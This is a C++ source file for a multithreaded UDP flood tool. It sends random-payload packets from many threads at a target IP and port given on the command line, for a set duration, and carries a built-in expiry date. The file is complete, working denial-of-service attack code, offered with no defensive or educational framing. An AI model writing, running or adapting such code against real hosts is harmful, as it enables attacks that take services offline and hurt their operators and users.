#include <iostream>
#include <thread>
#include <vector>
#include <cstring>
#include <cstdlib>
#include <ctime>
#include <random>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <unistd.h>
#include <chrono>

// Constants
constexpr int DEFAULT_PACKET_SIZE = 12000; // Configurable packet size
constexpr int DEFAULT_THREAD_COUNT = 80;  // Default number of threads

// Expiry Date
constexpr int EXPIRY_YEAR = 2024;
constexpr int EXPIRY_MONTH = 12;
constexpr int EXPIRY_DAY = 29;

// Function to validate expiration
bool is_expired() {
    auto now = std::chrono::system_clock::now();
    std::time_t now_c = std::chrono::system_clock::to_time_t(now);
    struct tm *parts = std::localtime(&now_c);
    if (parts->tm_year + 1900 > EXPIRY_YEAR ||
        (parts->tm_year + 1900 == EXPIRY_YEAR && parts->tm_mon + 1 > EXPIRY_MONTH) ||
        (parts->tm_year + 1900 == EXPIRY_YEAR && parts->tm_mon + 1 == EXPIRY_MONTH && parts->tm_mday > EXPIRY_DAY)) {
        return true;
    }
    return false;
}

// Random Payload Generator
std::vector<uint8_t> generate_random_payload(size_t size) {
    std::vector<uint8_t> payload(size);
    std::random_device rd;
    std::mt19937 gen(rd());
    std::uniform_int_distribution<> dis(0, 255);
    for (auto &byte : payload) {
        byte = dis(gen);
    }
    return payload;
}

// UDP Flood Function
void udp_flood(const std::string &target_ip, uint16_t target_port, int duration, size_t packet_size) {
    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) {
        std::cerr << "Error: Could not create socket." << std::endl;
        return;
    }

    struct sockaddr_in target_addr{};
    target_addr.sin_family = AF_INET;
    target_addr.sin_port = htons(target_port);
    if (inet_pton(AF_INET, target_ip.c_str(), &target_addr.sin_addr) <= 0) {
        std::cerr << "Error: Invalid IP address format." << std::endl;
        close(sock);
        return;
    }

    auto payload = generate_random_payload(packet_size);
    auto start_time = std::chrono::steady_clock::now();

    while (std::chrono::steady_clock::now() - start_time < std::chrono::seconds(duration)) {
        sendto(sock, payload.data(), payload.size(), 0, (struct sockaddr *)&target_addr, sizeof(target_addr));
    }

    close(sock);
}

// Main
int main(int argc, char *argv[]) {
    if (is_expired()) {
        std::cerr << "This program has expired." << std::endl;
        return 1;
    }

    if (argc < 4) {
        std::cout << "Usage: " << argv[0] << " <target_ip> <target_port> <duration> [packet_size] [threads]" << std::endl;
        return 1;
    }

    std::string target_ip = argv[1];
    uint16_t target_port = static_cast<uint16_t>(std::stoi(argv[2]));
    int duration = std::stoi(argv[3]);
    size_t packet_size = (argc > 4) ? std::stoul(argv[4]) : DEFAULT_PACKET_SIZE;
    int thread_count = (argc > 5) ? std::stoi(argv[5]) : DEFAULT_THREAD_COUNT;

    std::vector<std::thread> threads;
    for (int i = 0; i < thread_count; ++i) {
        threads.emplace_back(udp_flood, target_ip, target_port, duration, packet_size);
    }

    for (auto &thread : threads) {
        thread.join();
    }

    std::cout << "UDP flood completed." << std::endl;
    return 0;
}
